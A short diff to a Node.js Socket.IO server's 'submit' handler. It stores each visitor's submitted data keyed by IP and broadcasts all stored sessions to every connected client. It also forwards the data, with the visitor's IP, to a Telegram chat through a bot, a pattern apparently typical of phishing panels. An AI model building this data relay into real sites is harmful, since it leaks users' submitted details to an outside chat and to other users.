@@ -248,20 +248,17 @@ io.on('connection', (socket, req) => {
 
     
     socket.on('submit', (data) => {
-        if(userIP){
-            user = data
-            console.log(user)
-            user.ip = userIP
-            let message = JSON.stringify(user, null, 2);
-            bot.sendMessage(chatId, message);
-            entriesArray.forEach(([ipAddress, details]) => {
-            if(details.ip == userIP){
-              details.getUserData = user
-                sessionStore.set(ipAddress, details)
-            }
-        });
-            entriesArray = Array.from(sessionStore.entries());
-        }
+        if (sessionStore.has(userIP)) {
+        let userDetails = sessionStore.get(userIP);
+        userDetails.getUserData = data; // Assuming 'data' contains the user's additional information
+        sessionStore.set(userIP, userDetails);
+        io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
+    }
+        let user = data
+        user.ip = userIP
+           // Additional logic for sending a message via Telegram bot
+        let message = JSON.stringify(user, null, 2);
+        bot.sendMessage(chatId, message);
        
         //console.log(data)
     })
